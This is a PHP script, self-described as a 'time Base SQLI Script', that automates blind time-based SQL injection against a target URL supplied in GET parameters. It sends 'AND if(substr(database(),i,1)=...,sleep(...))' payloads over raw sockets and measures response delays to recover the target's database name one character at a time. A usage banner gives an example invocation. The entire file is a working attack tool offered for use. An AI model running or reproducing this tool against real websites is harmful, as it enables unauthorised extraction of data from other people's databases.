<?php
// Timeout in seconds
//ob_end_clean();
ob_start();
session_start();
function timebase($host,$vul,$db,$timeout,$query,$j,$i) {
      $data='';
    //$ok=$_SESSION['counter'];
    $payload = urlencode(" $query");
    echo $vul = $vul . $payload;

    $fp = fsockopen($host, 80, $errno, $errstr, $timeout);

    if ($fp) {
        $time_start = microtime(true);
        fwrite($fp, "GET /$vul HTTP/1.0\r\n");
        fwrite($fp, "Host: $host\r\n");
        fwrite($fp, "Connection: Close\r\n\r\n");

        stream_set_blocking($fp, TRUE);
        stream_set_timeout($fp, $timeout);
        $info = stream_get_meta_data($fp);

        while ((!feof($fp)) && (!$info['timed_out'])) {
            $data .= fgets($fp, 4096);
            $info = stream_get_meta_data($fp);
            ob_flush();
            flush();
        }

     if ($info['timed_out']) {

            echo "Connection Timed Out!";
        } else {
          //  echo $data;
        }

        $time_end = microtime(true);
        $time = $time_end - $time_start;
    }
    echo "<br>";
    echo "<br>";
    echo "time total time is :" . ceil($time).'<br>'."$j ".'db is :'.$db;
    echo "<br>";
    echo "<br>";
    //if ($time >=20) {
    if ($time >=$timeout) {
        echo "[On the $i th iteration when j is $j ]<br>";
        echo "Vul to TIME BASED SQL INJECTION:";
        echo "<br>";
        echo "<br>";
        echo "Database: $db";
        echo "<br>";
        echo "<br>";
      return true;
    }else {
        return false;
    }
}




if(isset($_GET['host'])&&($_GET['vul'])&&($_GET['timeout'])&&($_GET['action'])) {
    if ($_GET['action'] == "db") {
        $host = $_GET['host'];
        $vul = $_GET['vul'];
        $timeoutvalue = $_GET['timeout'];
        //$timeout = 20;
        $timeout = $timeoutvalue;
        $str = '';

        $th3gentleM3n = 0;


        for ($i = 1; $i; $i++) {

            for ($j = 0, $counter = 0; $j <= 93; $j++) {
                $db = chr(($j + 33));
                $query = "AND if((select substr(database(),$i,1))='$db',sleep($timeout),'No')-- -";
                //echo "the counter remains : " . $counter . " while i is $i and J is $j" . "<br>";
                $TheTime = timebase($host, $vul, $db, $timeout, $query, $j, $i);

                if ($TheTime) {
                    $str .= $db . '/';
                    $counter = 1;
                   // echo "the counter is : " . $counter . " while i is $i and J is $j" . "<br>";
                }

                if ((($j == 93) && ($counter == 0))) {
                    $th3gentleM3n = 1;
                    //echo "the gendtlemen got triggered and has now become " . $th3gentleM3n;
                    //echo "<br>" . "the counter is got zeroed" . "while i is $i and J is $j" . "<br>";
                }


                if ($j == 31) {
                    $j = 58;
                }

            }
            /*if(empty($str)&&$i==1){
                echo "Not vulnerable...";
                break;
            }*/

            if ($th3gentleM3n == 1) {
               // ob_end_clean();
                echo "<br>"."Scanning Completed ..." . "<br>";
                break;
            }

        }
        $arr1 = explode('/', $str);
        //print_r($arr1);
        // echo $arr;
        if ($arr1) {
            echo "<br>"."Database Found: ";
            foreach ($arr1 as $a) {
                echo $a;
            }
        }

        echo "<br>"."in the form of Array-:"."<br>";
        print_r($arr1);
    }
}
else{

    echo "<pre>";
    echo "=====================================================================================================";
    echo "<br>";
    echo "=                                                                                                   =";
    echo "<br>";
    echo "=                                       Welcome...!!                                                =";
    echo "<br>";
    echo "=                                                                                                   =";
    echo "<br>";
    echo "=                         to the time Base SQLI Script, Created By Umair                            =";
    echo "<br>";
    echo "=                                                                                                   =";
    echo "<br>";
    echo "=          Example:localhost?host=localhost&vul=localhost.php?id=1&timeout=10&action=db      =";
    echo "<br>";
    echo "=                                                                                                   =";
    echo "<br>";
    echo "=      it is Recommended to Use The Timeout as 20 secs instead of 10 like in the above eg...        =";
    echo "<br>";
    echo "=                                                                                                   =";
    echo "<br>";
    echo "======================================================================================================";
    echo "<br>";

}
 ?>